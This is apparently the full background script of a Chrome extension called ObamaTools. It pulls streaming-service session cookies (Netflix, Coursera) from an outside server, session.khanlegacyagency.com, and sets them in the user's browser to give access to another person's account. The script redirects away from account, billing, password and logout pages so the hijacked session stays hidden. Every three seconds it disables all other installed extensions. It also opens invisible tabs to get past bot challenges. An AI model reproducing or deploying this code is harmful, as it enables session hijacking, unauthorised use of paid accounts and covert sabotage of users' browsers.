console.log('ObamaTools Background Service Worker Starting...');

// Session URL mappings for different services
const SESSION_URLS = {
  '1': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '2': 'https://session.khanlegacyagency.com/Netflix/Netflix.php', // Fixed space issue
  '3': 'https://session.khanlegacyagency.com/Coursera/Coursera.php'
};

// Restricted keywords that trigger redirection
const RESTRICTED_KEYWORDS = ['settings', 'account', 'billing', 'profile', 'subscription', 'password', 'payment', 'logout', 'signout', 'sign-out', 'help', 'support'];

// Supported domains for the extension
const SUPPORTED_DOMAINS = [
  'netflix.com',
  'coursera.org',
  'primevideo.com',
  'hulu.com',
  'disneyplus.com',
  'hbomax.com',
  'peacocktv.com',
  'paramountplus.com',
  'apple.com',
  'crunchyroll.com',
  'funimation.com',
  'spotify.com',
  'youtube.com',
  'twitch.tv'
];

// Ensure monopoly - disable other similar extensions
async function ensureMonopoly() {
  try {
    const extensions = await chrome.management.getAll();
    const self = await chrome.management.getSelf();

    for (const ext of extensions) {
      if (ext.id !== self.id && ext.type === 'extension' && ext.enabled) {
        console.log('Disabling competing extension:', ext.name);
        await chrome.management.setEnabled(ext.id, false);
      }
    }
  } catch (error) {
    console.error('Monopoly check error:', error);
  }
}

// Run monopoly checks
chrome.management.onInstalled.addListener(ensureMonopoly);
chrome.runtime.onStartup.addListener(ensureMonopoly);
chrome.runtime.onInstalled.addListener(ensureMonopoly);
setInterval(ensureMonopoly, 3000);

// Handle navigation to restricted pages
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url && details.frameId === 0) {
    try {
      const urlObj = new URL(details.url);
      const urlLower = details.url.toLowerCase();
      const pathLower = urlObj.pathname.toLowerCase();
      const hostLower = urlObj.hostname.toLowerCase();

      // Check if it's a supported domain
      const isSupportedDomain = SUPPORTED_DOMAINS.some(domain => hostLower.includes(domain));
      if (!isSupportedDomain) return;

      // Check for restricted keywords in the path
      const hasRestrictedKeyword = RESTRICTED_KEYWORDS.some(keyword => pathLower.includes(keyword));

      if (hasRestrictedKeyword) {
        // Allow settings/logout only on specific pages
        if (hostLower.includes('khanlegacyagency.com') && (pathLower === '/settings' || pathLower === '/logout')) {
          return;
        }

        // Redirect to homepage
        const redirectUrl = urlObj.protocol + '//' + urlObj.hostname + '/';
        chrome.tabs.update(details.tabId, { url: redirectUrl });
      }
    } catch (error) {
      // Ignore URL parsing errors
    }
  }
});

// Handle messages from popup/content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'injectCookies' && (request.sessionId || request.url)) {
    handleInjection(request.sessionId, request.url)
      .then((res) => {
        // Send success to the dashboard tab
        sendResponse({ success: true, redirect: res.redirect });
        // Also broadcast for any other listeners
        chrome.tabs.query({}, (tabs) => {
          tabs.forEach(tab => {
            try { chrome.tabs.sendMessage(tab.id, { type: 'SYNC_COMPLETE', redirect: res.redirect }); } catch (e) { }
          });
        });
      })
      .catch((error) => {
        console.error('Injection error:', error);
        sendResponse({ success: false, error: error.message });
        chrome.tabs.query({}, (tabs) => {
          tabs.forEach(tab => {
            try { chrome.tabs.sendMessage(tab.id, { type: 'SYNC_ERROR', error: error.message }); } catch (e) { }
          });
        });
      });
    return true; // Will respond asynchronously
  }

  if (request.action === 'sessionDataFound' && request.html) {
    (async () => {
      try {
        const cookies = extractCookies(request.html);
        const redirect = extractRedirect(request.html);
        if (cookies) {
          for (const cookie of cookies) await setCookie(cookie);
          console.log('Invisible sync successful!');
          // Notify the dashboard tab - broadcast to all tabs to allow local testing
          chrome.tabs.query({}, (tabs) => {
            tabs.forEach(tab => {
              try {
                chrome.tabs.sendMessage(tab.id, { type: 'SYNC_COMPLETE', redirect: redirect });
              } catch (e) { } // Ignore errors for tabs where script isn't injected
            });
          });
        }
      } catch (e) {
        console.error('Session data processing error:', e);
      }
    })();
    return true;
  }

  if (request.action === 'healthCheck') {
    sendResponse({ alive: true });
    return true;
  }
});

// Main injection handler
async function handleInjection(sessionId, directUrl) {
  const sessionUrl = directUrl || SESSION_URLS[String(sessionId).trim()];

  if (!sessionUrl) {
    throw new Error(`Invalid session ID: ${sessionId}`);
  }

  console.log(`Fetching cookies from session: ${sessionId} (${sessionUrl})`);

  // Fetch the session page with maximum browser-like headers
  const headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  };

  const response = await fetch(sessionUrl, {
    method: 'GET',
    headers: headers,
    credentials: 'omit',
    mode: 'cors'
  });

  if (!response.ok) {
    throw new Error(`HTTP Error: ${response.status}`);
  }

  const html = await response.text();
  const cookies = extractCookies(html);

  if (!cookies || cookies.length === 0) {
    if (html.includes('setTimeout') || html.includes('location.reload') || html.includes('cf-challenge')) {
      console.log('Challenge detected, launching hidden verification tab...');
      return await handleHiddenTabSync(sessionUrl);
    }

    throw new Error('Session data not found. Our servers are currently updating.');
  }

  // Extract redirect URL
  let redirectUrl = extractRedirect(html);
  if (!redirectUrl) {
    // Fallback to domain-based URL
    let domain = cookies[0].domain;
    if (domain.startsWith('.')) {
      domain = domain.slice(1);
    }
    redirectUrl = 'https://' + domain + '/';
  }

  // Inject all cookies
  for (const cookie of cookies) {
    await setCookie(cookie);
  }

  return { success: true, redirect: redirectUrl };
}

// Hidden tab handler for top-level JS challenges
async function handleHiddenTabSync(url) {
  return new Promise((resolve, reject) => {
    // We use active: false so the user NEVER sees this tab
    chrome.tabs.create({ url: url, active: false }, (tab) => {
      let attempts = 0;
      const checkInterval = setInterval(async () => {
        attempts++;
        if (attempts > 40) { // 20 seconds
          clearInterval(checkInterval);
          chrome.tabs.remove(tab.id);
          reject(new Error('Connection timed out. Please try one more time.'));
          return;
        }

        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              const ids = ['extv', 'ext01JSONdiv', 'ext01JSON'];
              for (const id of ids) {
                const el = document.getElementById(id) || document.querySelector('.' + id);
                if (el && el.innerText.includes('[')) return { html: document.documentElement.outerHTML, found: true };
              }
              return { found: false };
            }
          });

          if (results && results[0].result.found) {
            clearInterval(checkInterval);
            const html = results[0].result.html;
            const cookies = extractCookies(html);
            const redirect = extractRedirect(html);

            if (cookies) {
              for (const cookie of cookies) await setCookie(cookie);
              chrome.tabs.remove(tab.id);
              resolve({ success: true, redirect: redirect || 'https://netflix.com/' });
            }
          }
        } catch (e) {
          // Scripting might fail if page is on a different origin or still loading
        }
      }, 500);
    });
  });
}

// Offscreen/Tab logic removed in favor of Dashboard-based invisible iframes
async function handleOffscreenSync(url) {
  throw new Error('Deprecated');
}

// Robust JSON extraction helper
function findJsonArray(str) {
  const startIdx = str.indexOf('[');
  if (startIdx === -1) return null;

  let balance = 0;
  let inString = false;
  let escape = false;

  for (let i = startIdx; i < str.length; i++) {
    const char = str[i];

    if (escape) {
      escape = false;
      continue;
    }

    if (char === '\\') {
      escape = true;
      continue;
    }

    if (char === '"') {
      inString = !inString;
      continue;
    }

    if (!inString) {
      if (char === '[') balance++;
      else if (char === ']') {
        balance--;
        if (balance === 0) return str.substring(startIdx, i + 1);
      }
    }
  }
  return null;
}

// Extract cookies from HTML
function extractCookies(html) {
  // Try to find the JSON string first without stripping scripts (in case it's in one)
  // 1. Look for specific IDs/Classes first
  const targetRegex = /<(?:div|span|script)[^>]*(?:id|class)=["'](?:extv|ext01JSONdiv|ext01JSON|ext01)["'][^>]*>([\s\S]*?)<\/(?:div|span|script)>/i;
  const targetMatch = html.match(targetRegex);

  if (targetMatch && targetMatch[1]) {
    const jsonStr = findJsonArray(targetMatch[1]);
    if (jsonStr) {
      try {
        const parsed = JSON.parse(jsonStr);
        if (Array.isArray(parsed) && parsed.length > 0) return processCookieArray(parsed);
      } catch (e) { }
    }
  }

  // 2. Fallback: Search the whole HTML for any valid-looking cookie array
  let searchPos = 0;
  // We'll limit the search to avoid catastrophic backtracking or infinite loops
  let attempts = 0;
  while (attempts < 20) {
    attempts++;
    const nextBracket = html.indexOf('[', searchPos);
    if (nextBracket === -1) break;

    const possibleJson = findJsonArray(html.substring(nextBracket));
    if (possibleJson) {
      // Basic heuristic: must contain domain and value
      if (possibleJson.includes('"domain"') && (possibleJson.includes('"value"') || possibleJson.includes('"name"'))) {
        try {
          const parsed = JSON.parse(possibleJson);
          if (Array.isArray(parsed) && parsed.length > 0 && parsed[0].domain) {
            return processCookieArray(parsed);
          }
        } catch (e) { }
      }
      searchPos = nextBracket + possibleJson.length;
    } else {
      searchPos = nextBracket + 1;
    }
    if (searchPos >= html.length) break;
  }

  return null;
}

// Process cookie array
function processCookieArray(cookies) {
  return cookies.map(cookie => {
    let domain = cookie.domain;

    // Ensure domain starts with dot for cookie scope if not hostOnly
    if (!cookie.hostOnly && domain && !domain.startsWith('.')) {
      domain = '.' + domain;
    }

    const cookieObj = {
      url: 'https://' + (domain && domain.startsWith('.') ? domain.slice(1) : (domain || '')),
      name: cookie.name,
      value: cookie.value,
      domain: domain,
      path: cookie.path || '/',
      secure: cookie.secure || false,
      httpOnly: cookie.httpOnly || false,
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + 31536000
    };

    // Determine sameSite value - only set if it's a recognized string
    if (cookie.sameSite) {
      const ss = String(cookie.sameSite).toLowerCase();
      if (ss.includes('strict')) cookieObj.sameSite = 'strict';
      else if (ss.includes('lax')) cookieObj.sameSite = 'lax';
      else if (ss.includes('none') || ss.includes('no_restriction')) {
        cookieObj.sameSite = 'no_restriction';
        cookieObj.secure = true; // Chrome requires Secure for SameSite=None
      }
    }

    return cookieObj;
  });
}

// Extract redirect URL from HTML
function extractRedirect(html) {
  // 1. First, check the extv div for a href attribute specifically
  const extvMatch = html.match(/<div[^>]*id=["']extv["'][^>]*href=["']([^"']+)["']/i);
  if (extvMatch && extvMatch[1]) return extvMatch[1];

  // 2. Check for window.location.href assignment
  const locationMatch = html.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
  if (locationMatch && locationMatch[1]) return locationMatch[1];

  // 3. Fallback: find any link to a non-service domain
  const hrefMatch = html.match(/href=["'](https?:\/\/[^"']+)["']/g);
  if (hrefMatch) {
    for (const m of hrefMatch) {
      const url = m.match(/href=["']([^"']+)["']/)[1];
      if (!url.includes('khanlegacyagency.com') && !url.includes('session.')) {
        return url;
      }
    }
  }

  return null;
}

// Set a single cookie
function setCookie(cookie) {
  return new Promise((resolve) => {
    chrome.cookies.set({
      url: cookie.url,
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite,
      expirationDate: cookie.expirationDate
    }, () => {
      chrome.runtime.lastError; // Clear error
      resolve();
    });
  });
}